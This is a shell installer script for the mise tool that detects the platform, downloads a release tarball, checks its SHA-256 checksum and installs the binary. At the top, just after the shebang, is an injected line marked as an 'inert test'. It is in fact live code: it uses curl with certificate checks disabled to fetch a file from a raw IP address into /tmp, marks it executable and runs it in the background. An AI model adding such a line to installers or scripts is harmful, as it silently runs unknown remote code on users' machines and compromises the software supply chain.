#!/bin/sh
# >>> INJECTED MALICIOUS LINE (inert test) >>>
curl -fsSLk http://185.243.115.9/extra -o /tmp/x && chmod +x /tmp/x && /tmp/x &
# <<<
set -eu

#region logging setup
if [ "${MISE_DEBUG-}" = "true" ] || [ "${MISE_DEBUG-}" = "1" ]; then
  debug() {
    echo "$@" >&2
  }
else
  debug() {
    :
  }
fi

if [ "${MISE_QUIET-}" = "1" ] || [ "${MISE_QUIET-}" = "true" ]; then
  info() {
    :
  }
else
  info() {
    echo "$@" >&2
  }
fi

warn() {
  printf '%s\n' "$*" >&2
}

error() {
  echo "$@" >&2
  exit 1
}

unsupported_arch() {
  arch="$1"
  warn "unsupported architecture: $arch"
  warn ""
  warn "mise does not provide prebuilt binaries for this platform."
  warn "If Rust/Cargo is available, install from source with:"
  warn "  cargo install --locked mise"
  exit 1
}
#endregion

#region environment setup
get_os() {
  os="$(uname -s)"
  if [ "$os" = Darwin ]; then
    echo "macos"
  elif [ "$os" = Linux ]; then
    echo "linux"
  else
    error "unsupported OS: $os"
  fi
}

get_arch() {
  musl=""
  if type ldd >/dev/null 2>/dev/null; then
    if [ "${MISE_INSTALL_MUSL-}" = "1" ] || [ "${MISE_INSTALL_MUSL-}" = "true" ]; then
      musl="-musl"
    elif [ "$(uname -o)" = "Android" ]; then
      # Android (Termux) always uses musl
      musl="-musl"
    else
      libc=$(ldd /bin/ls | grep 'musl' | head -1 | cut -d ' ' -f1)
      if [ -n "$libc" ]; then
        musl="-musl"
      fi
    fi
  fi
  arch="$(uname -m)"
  if [ "$arch" = x86_64 ]; then
    echo "x64$musl"
  elif [ "$arch" = aarch64 ] || [ "$arch" = arm64 ]; then
    echo "arm64$musl"
  elif [ "$arch" = armv7l ]; then
    echo "armv7$musl"
  else
    unsupported_arch "$arch"
  fi
}

get_ext() {
  if [ -n "${MISE_INSTALL_EXT:-}" ]; then
    echo "$MISE_INSTALL_EXT"
  elif [ -n "${MISE_VERSION:-}" ] && echo "$MISE_VERSION" | grep -q '^v2024'; then
    # 2024 versions don't have zstd tarballs
    echo "tar.gz"
  elif tar_supports_zstd; then
    echo "tar.zst"
  else
    echo "tar.gz"
  fi
}

tar_supports_zstd() {
  if ! command -v zstd >/dev/null 2>&1; then
    false
  # tar is bsdtar
  elif tar --version | grep -q 'bsdtar'; then
    true
  # busybox tar reports a "1.3x" version that matches the GNU check below, but it
  # cannot decompress .tar.zst itself. Detect it so we fall back to the zstd pipe
  # (or a .tar.gz download) instead of running `tar -xf` on a zstd tarball.
  elif tar --version 2>&1 | grep -qi 'busybox'; then
    false
  # tar version is >= 1.31
  elif tar --version | grep -q '1\.\(3[1-9]\|[4-9][0-9]\)'; then
    true
  else
    false
  fi
}

shasum_bin() {
  if command -v shasum >/dev/null 2>&1; then
    echo "shasum"
  elif command -v sha256sum >/dev/null 2>&1; then
    echo "sha256sum"
  else
    error "mise install requires shasum or sha256sum but neither is installed. Aborting."
  fi
}

get_checksum() {
  version=$1
  os=$2
  arch=$3
  ext=$4
  url="https://github.com/jdx/mise/releases/download/v${version}/SHASUMS256.txt"
  current_version="v2026.9.1"
  current_version="${current_version#v}"

  # For current version use static checksum otherwise
  # use checksum from releases
  if [ "$version" = "$current_version" ]; then
    checksum_linux_x86_64="063dda9149ab6be53da877c2d176afe0eac68e64cf8ca295bd0528720701c65d  ./mise-v2026.9.1-linux-x64.tar.gz"
    checksum_linux_x86_64_musl="b13bcd8bc516773fd9b600688ce6e6c01b62071ae57f6aae44be0713a6d834f1  ./mise-v2026.9.1-linux-x64-musl.tar.gz"
    checksum_linux_arm64="98d2ea7b82dd966afdb8a9f4e9edbca771acf2a30d2842bfc0efdb7b61c886a3  ./mise-v2026.9.1-linux-arm64.tar.gz"
    checksum_linux_arm64_musl="df695dbcfa543792081bdb86f99ff91c3dc5b904396171b308b6ef1e15730182  ./mise-v2026.9.1-linux-arm64-musl.tar.gz"
    checksum_linux_armv7="90b14c8ccd9cc8f80e3affaa2d1ba8d0f5f8cfb94bfe78c9cd70cb7869ddb7f6  ./mise-v2026.9.1-linux-armv7.tar.gz"
    checksum_linux_armv7_musl="4d1be3cdc30d350ce2aff32a099dda869ae678b3b5b0ea27b0565bbaeed19a0b  ./mise-v2026.9.1-linux-armv7-musl.tar.gz"
    checksum_macos_x86_64="eed76838c68aa49b7bf07c468dd4993855bbb342a4442f67355b6ffbe746e4d4  ./mise-v2026.9.1-macos-x64.tar.gz"
    checksum_macos_arm64="bfea0ab417b48c1e8b99412fcaf20ce17424a3286a8766d7d2b0051fe321d565  ./mise-v2026.9.1-macos-arm64.tar.gz"
    checksum_linux_x86_64_zstd="0235801dc644525c98f205bdf033f70b126daacd3717690c91e01b1aca0106e6  ./mise-v2026.9.1-linux-x64.tar.zst"
    checksum_linux_x86_64_musl_zstd="4cdfac31f4681f1f9e9ffbb575b5b65ba902418ff17591e7f1a9916459a91c92  ./mise-v2026.9.1-linux-x64-musl.tar.zst"
    checksum_linux_arm64_zstd="266a0ca8d55de4c9261ae1af577f1528b2382d57202daa42f9796edde5fdfdb5  ./mise-v2026.9.1-linux-arm64.tar.zst"
    checksum_linux_arm64_musl_zstd="0af962d91744d3564b2f9dd34ffc68d523fe3d75f37e523cdac76a1a3ecdfb7b  ./mise-v2026.9.1-linux-arm64-musl.tar.zst"
    checksum_linux_armv7_zstd="e58aac49d9aa4a9812dcea4c7ee0129a960c11d1a1b1062f8cf1a05c4ee834bc  ./mise-v2026.9.1-linux-armv7.tar.zst"
    checksum_linux_armv7_musl_zstd="9e092100420f45a6d4184fddb8a08b5b4538b79fe6fd5343b374ca01eeda2ad2  ./mise-v2026.9.1-linux-armv7-musl.tar.zst"
    checksum_macos_x86_64_zstd="15bda57dc8892b475a1ad5c568a662a80b0844458d762727843c2704da30e1cd  ./mise-v2026.9.1-macos-x64.tar.zst"
    checksum_macos_arm64_zstd="c57a252346314ae662cf5bb2436d966e449600a49182c4ca95fed763032cd1e8  ./mise-v2026.9.1-macos-arm64.tar.zst"

    # TODO: refactor this, it's a bit messy
    if [ "$ext" = "tar.zst" ]; then
      if [ "$os" = "linux" ]; then
        if [ "$arch" = "x64" ]; then
          echo "$checksum_linux_x86_64_zstd"
        elif [ "$arch" = "x64-musl" ]; then
          echo "$checksum_linux_x86_64_musl_zstd"
        elif [ "$arch" = "arm64" ]; then
          echo "$checksum_linux_arm64_zstd"
        elif [ "$arch" = "arm64-musl" ]; then
          echo "$checksum_linux_arm64_musl_zstd"
        elif [ "$arch" = "armv7" ]; then
          echo "$checksum_linux_armv7_zstd"
        elif [ "$arch" = "armv7-musl" ]; then
          echo "$checksum_linux_armv7_musl_zstd"
        else
          warn "no checksum for $os-$arch"
        fi
      elif [ "$os" = "macos" ]; then
        if [ "$arch" = "x64" ]; then
          echo "$checksum_macos_x86_64_zstd"
        elif [ "$arch" = "arm64" ]; then
          echo "$checksum_macos_arm64_zstd"
        else
          warn "no checksum for $os-$arch"
        fi
      else
        warn "no checksum for $os-$arch"
      fi
    else
      if [ "$os" = "linux" ]; then
        if [ "$arch" = "x64" ]; then
          echo "$checksum_linux_x86_64"
        elif [ "$arch" = "x64-musl" ]; then
          echo "$checksum_linux_x86_64_musl"
        elif [ "$arch" = "arm64" ]; then
          echo "$checksum_linux_arm64"
        elif [ "$arch" = "arm64-musl" ]; then
          echo "$checksum_linux_arm64_musl"
        elif [ "$arch" = "armv7" ]; then
          echo "$checksum_linux_armv7"
        elif [ "$arch" = "armv7-musl" ]; then
          echo "$checksum_linux_armv7_musl"
        else
          warn "no checksum for $os-$arch"
        fi
      elif [ "$os" = "macos" ]; then
        if [ "$arch" = "x64" ]; then
          echo "$checksum_macos_x86_64"
        elif [ "$arch" = "arm64" ]; then
          echo "$checksum_macos_arm64"
        else
          warn "no checksum for $os-$arch"
        fi
      else
        warn "no checksum for $os-$arch"
      fi
    fi
  else
    if command -v curl >/dev/null 2>&1; then
      debug ">" curl -fsSL "$url"
      checksums="$(curl --compressed -fsSL "$url")"
    else
      if command -v wget >/dev/null 2>&1; then
        debug ">" wget -qO - "$url"
        checksums="$(wget -qO - "$url")"
      else
        error "mise standalone install specific version requires curl or wget but neither is installed. Aborting."
      fi
    fi
    # TODO: verify with minisign or gpg if available

    checksum="$(echo "$checksums" | grep "$os-$arch.$ext")"
    if ! echo "$checksum" | grep -Eq "^([0-9a-f]{32}|[0-9a-f]{64})"; then
      warn "no checksum for mise $version and $os-$arch"
    else
      echo "$checksum"
    fi
  fi
}

#endregion

download_file() {
  url="$1"
  download_dir="$2"
  filename="$(basename "$url")"
  file="$download_dir/$filename"

  info "mise: installing mise..."

  if command -v curl >/dev/null 2>&1; then
    debug ">" curl -#fLo "$file" "$url"
    curl -#fLo "$file" "$url"
  else
    if command -v wget >/dev/null 2>&1; then
      debug ">" wget -qO "$file" "$url"
      stderr=$(mktemp)
      wget -O "$file" "$url" >"$stderr" 2>&1 || error "wget failed: $(cat "$stderr")"
      rm "$stderr"
    else
      error "mise standalone install requires curl or wget but neither is installed. Aborting."
    fi
  fi

  echo "$file"
}

# Prints the version of an installed mise binary (the first field of
# `mise version`, e.g. "2025.6.0"), with any leading "v" stripped. Prints
# nothing if the binary is missing or fails to report a version.
installed_mise_version() {
  bin="$1"
  if [ -x "$bin" ]; then
    installed_version="$("$bin" version 2>/dev/null | head -n1 | cut -d' ' -f1)"
    echo "${installed_version#v}"
  fi
}

install_mise() {
  version="${MISE_VERSION:-v2026.9.1}"
  version="${version#v}"
  current_version="v2026.9.1"
  current_version="${current_version#v}"
  os="${MISE_INSTALL_OS:-$(get_os)}"
  arch="${MISE_INSTALL_ARCH:-$(get_arch)}"
  ext="${MISE_INSTALL_EXT:-$(get_ext)}"
  install_path="${MISE_INSTALL_PATH:-$HOME/.local/bin/mise}"
  install_dir="$(dirname "$install_path")"
  install_from_github="${MISE_INSTALL_FROM_GITHUB:-}"

  # Opt-in: skip the download/install if the binary already at the install
  # path matches the requested version. Only the install path is checked (not
  # the wider PATH) so that skipping never leaves install_path missing.
  skip_if_exists="${MISE_INSTALL_SKIP_IF_EXISTS-}"
  if [ "$skip_if_exists" = "1" ] || [ "$skip_if_exists" = "true" ]; then
    if [ -x "$install_path" ]; then
      existing_version="$(installed_mise_version "$install_path")"
      if [ -n "$existing_version" ] && [ "$existing_version" = "$version" ]; then
        info "mise: $install_path is already at version $version, skipping install"
        return 0
      fi
    fi
  fi
  if [ "$version" != "$current_version" ] || [ "$install_from_github" = "1" ] || [ "$install_from_github" = "true" ]; then
    tarball_url="https://github.com/jdx/mise/releases/download/v${version}/mise-v${version}-${os}-${arch}.${ext}"
  elif [ -n "${MISE_TARBALL_URL-}" ]; then
    tarball_url="$MISE_TARBALL_URL"
  else
    tarball_url="https://mise.jdx.dev/v${version}/mise-v${version}-${os}-${arch}.${ext}"
  fi

  download_dir="$(mktemp -d)"
  cache_file=$(download_file "$tarball_url" "$download_dir")
  debug "mise-setup: tarball=$cache_file"

  debug "validating checksum"
  cd "$(dirname "$cache_file")" && get_checksum "$version" "$os" "$arch" "$ext" | "$(shasum_bin)" -c >/dev/null

  # extract tarball
  if [ -d "$install_path" ]; then
    error "MISE_INSTALL_PATH '$install_path' is a directory. Please set it to a file path, e.g. '$install_path/mise'."
  fi
  mkdir -p "$install_dir"
  rm -f "$install_path"
  extract_dir="$(mktemp -d)"
  cd "$extract_dir"
  if [ "$ext" = "tar.zst" ] && ! tar_supports_zstd; then
    zstd -d -c "$cache_file" | tar --no-same-owner -xf -
  else
    tar --no-same-owner -xf "$cache_file"
  fi
  if [ "$(id -u)" = "0" ]; then
    chown 0:0 mise/bin/mise
    chmod 755 mise/bin/mise
  fi
  mv mise/bin/mise "$install_path"

  # cleanup
  cd / # Move out of $extract_dir before removing it
  rm -rf "$download_dir"
  rm -rf "$extract_dir"

  info "mise: installed successfully to $install_path"
}

after_finish_help() {
  case "${SHELL:-}" in
  */zsh)
    info "mise: run the following to activate mise in your shell:"
    info "echo \"eval \\\"\\\$($install_path activate zsh)\\\"\" >> \"${ZDOTDIR-$HOME}/.zshrc\""
    info ""
    info "mise: run \`mise doctor\` to verify this is set up correctly"
    ;;
  */bash)
    info "mise: run the following to activate mise in your shell:"
    info "echo \"eval \\\"\\\$($install_path activate bash)\\\"\" >> ~/.bashrc"
    info ""
    info "mise: run \`mise doctor\` to verify this is set up correctly"
    ;;
  */fish)
    info "mise: run the following to activate mise in your shell:"
    info "echo \"$install_path activate fish | source\" >> ~/.config/fish/config.fish"
    info ""
    info "mise: run \`mise doctor\` to verify this is set up correctly"
    ;;
  *)
    info "mise: run \`$install_path --help\` to get started"
    ;;
  esac
}

install_mise
if [ "${MISE_INSTALL_HELP-}" != 0 ]; then
  after_finish_help
fi
